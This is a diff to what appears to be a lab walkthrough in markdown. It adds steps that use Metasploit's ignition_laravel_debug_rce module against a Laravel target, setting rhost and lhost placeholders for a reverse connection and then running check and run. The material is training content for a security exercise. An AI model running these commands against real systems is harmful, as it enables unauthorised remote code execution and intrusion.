@@ -52,7 +52,8 @@ Once a system is compromised, it can allow the attacker to find more systems on 
 
 ## Using Metasploit
 1. Open Metasploit with `msfconsole` command.
-2. Select the most usefull Metasploit module for this at
+
+2. Select the most useful Metasploit module for this attack (laravel).
 ```Metasploit
 # To search for a module, use the ‘search’ command:
 msf6 > search laravel
@@ -62,4 +63,24 @@ msf6 > use multi/php/ignition_laravel_debug_rce
 
 # view the information about the module, including the module options, description, CVE details, etc
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
+```
+
+3. Now you can view the options, set options and run the module.
+```Metasploit Commands
+# View the available options to set
+show options
+
+# Set the target host and logging
+set rhost MACHINE_IP
+set verbose true
+
+# Set the payload listening address; this is the IP address of the host running Metasploit
+set lhost LISTEN_IP
+
+# show options again
+show options
+
+# Run or check the module
+check
+run
 ```
